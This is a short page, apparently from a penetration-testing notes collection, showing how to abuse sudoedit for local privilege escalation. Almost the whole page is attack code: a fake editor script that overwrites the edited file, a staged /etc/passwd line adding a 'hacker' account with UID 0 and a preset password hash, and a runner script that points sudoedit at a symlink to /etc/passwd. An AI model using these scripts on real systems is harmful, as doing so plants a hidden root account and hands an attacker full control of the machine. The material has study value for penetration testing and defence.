# sudoedit

Based on the following existing solutions:

* [https://unix.stackexchange.com/questions/202929/using-sudoedit-in-a-script-non-interactively](https://unix.stackexchange.com/questions/202929/using-sudoedit-in-a-script-non-interactively)
* [https://shadow-file.blogspot.com/2009/01/how-to-sudoedit-non-interactively.html](https://shadow-file.blogspot.com/2009/01/how-to-sudoedit-non-interactively.html)

{% code title="editor.sh" %}
```text
#!/bin/sh
CAT=/bin/cat
PRE_STAGE="./stage.tmp"

$CAT $PRE_STAGE > "$1";
exit;
```
{% endcode %}

{% code title="stage.tmp \(this is the new /etc/passwd file\)" %}
```text
[...]
hacker:$1$pwn$sX7TFgG1yRswJLX53dwzy1:0:0:root:/root:/bin/bash
```
{% endcode %}

{% code title="sudoedit-passwd.sh" %}
```text
#!/bin/sh
OLD_EDITOR=$EDITOR;

export EDITOR="/bin/sh ./editor.sh";
PRE_STAGE=./stage.tmp;

sudoedit ./layout.html;  # symlinked file for /etc/passwd

export EDITOR=$OLD_EDITOR;

exit;
```
{% endcode %}

```text
bash sudoedit-passwd.sh
```

